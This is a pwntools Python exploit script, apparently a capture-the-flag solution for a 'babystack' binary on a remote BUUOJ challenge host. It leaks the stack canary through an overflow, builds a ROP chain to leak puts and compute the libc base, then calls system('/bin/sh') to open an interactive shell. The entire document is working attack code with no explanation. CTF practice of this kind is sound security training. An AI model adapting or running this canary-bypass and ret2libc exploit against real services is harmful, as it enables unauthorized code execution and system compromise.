from pwn import *
context.log_level='debug'
#io = process("./babystack")

io = remote("node4.buuoj.cn",27068)
elf = ELF("./babystack")
libc = ELF("./libc-x64-2.23.so")

pop_rdi=0x0400a93
elf=ELF('./babystack')
puts_got=elf.got['puts']
puts_plt=elf.plt['puts']
main_addr=0x400908

def cmd(choice):
    io.recvuntil(b">> ")
    io.sendline(str(choice))

def write(content):
    cmd(1)
    io.sendline(content)

def dump():
    cmd(2)

payload = 'a'*(0x90-0x8)
write(payload)
dump()
io.recvuntil('a\n')
canary = u64(io.recv(7).rjust(8,'\x00'))
log.success('canary: '+hex(canary))

payload = 'a'*(0x90-0x8) +p64(canary) +'b'*0x8 + p64(pop_rdi)
payload +=p64(puts_got)+p64(puts_plt)+ p64(main_addr)

write(payload)
io.sendlineafter('>>','3')
io.recv()
puts_addr=u64(io.recv(6).ljust(8,'\x00'))
log.success('puts_addr: '+hex(puts_addr))

base = puts_addr - libc.sym['puts']
sys_add = base + libc.sym['system']
bin_sh = base + libc.search("/bin/sh").next()
# gdb.attach(io)
payload = 'a'*(0x90-0x8) +p64(canary) +'b'*0x8 + p64(pop_rdi)
payload += p64(bin_sh) +p64(sys_add)

write(payload)
io.sendlineafter(">>",'3')
io.interactive()